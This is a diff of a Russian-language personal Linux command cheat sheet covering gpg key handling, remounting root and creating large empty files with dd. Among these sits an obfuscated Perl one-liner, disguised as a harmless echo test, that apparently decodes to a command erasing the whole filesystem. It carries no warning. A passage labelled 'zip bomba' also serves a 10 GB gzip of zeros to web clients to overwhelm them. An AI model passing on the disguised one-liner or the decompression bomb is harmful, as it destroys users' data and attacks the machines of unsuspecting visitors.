@@ -1,4 +1,4 @@
-version:1.2.1.3.12.1 :2.05.2020
+version:1.2.1.3.13 :16.05.2020
 _________________________________
 
 
@@ -125,25 +125,26 @@ printf "string" | md5sum
 gpg --recv-key 465022E743D71E39
 
 
-посмотреть все ключи-
+посмотреть все ключи gpg-
 
 gpg --list-keys --keyid-format LONG && gpg --list-secret-keys --keyid-format LONG
 
 
-редактировать ключ-
+редактировать ключ gpg-
 
 gpg --edit-key отпечаток 
 
 
-добавить новый сабключ-
+добавить новый сабключ gpg-
 
 gpg --quick-add-key отпечаток rsa1024 sign,encr,auth none
 
 
-удалить ключи-
+удалить ключи gpg-
 
 gpg --delete-secret-keys 0x12345678
 gpg --delete-keys 0x12345678
+
 
 
 
@@ -1844,9 +1845,10 @@ Alt + SysRq + I KILL - послать сигнал немедленного за
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
+перемонтировать корень-
 
 mount -o remount,rw /
--перемонтировать корень
+
 
 
 ________________
@@ -2397,11 +2399,26 @@ http://bit.ly/2S0v2rs
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ***
+создание "пустых" файлов
+
+
+dd if=/dev/zero of=/path/to/your/file bs=<razmer bloka> count=<skolko blokov>
+
+dd if=/dev/zero of=image.txt bs=1024M count=1
+
+dd of=file.txt bs=1 count=0 seek=100G
+
+
 dd if=/dev/zero bs=1M count=10240 | gzip > 10G.gzip
 
 dd if=/dev/zero bs=1M count=10240 >> 10
  zip -r 10.zip 10
  
+
+
+
+---------------------
+
 echo "test... test... test..." | perl -e '$??s:;s:s;;$?::s;;=]=>%-{<-|}<&|`{;;y; -/:-@[-`{-};`-{/" -;;s;;$_;see'
 
 <?php
@@ -2455,7 +2472,11 @@ function startsWith($a, $b) {
 
 
 
+
+----------------
  
+zip bomba-
+
  <?php
 //prepare the client to recieve GZIP data. This will not be suspicious
 //since most web servers use GZIP by default
@@ -2465,7 +2486,7 @@ header("Content-Length: ".filesize('10G.gzip'));
 if (ob_get_level()) ob_end_clean();
 //send the gzipped file to the client
 readfile('10G.gzip');
-                                                                              -zip bomba
+                                                                            
 
 
 
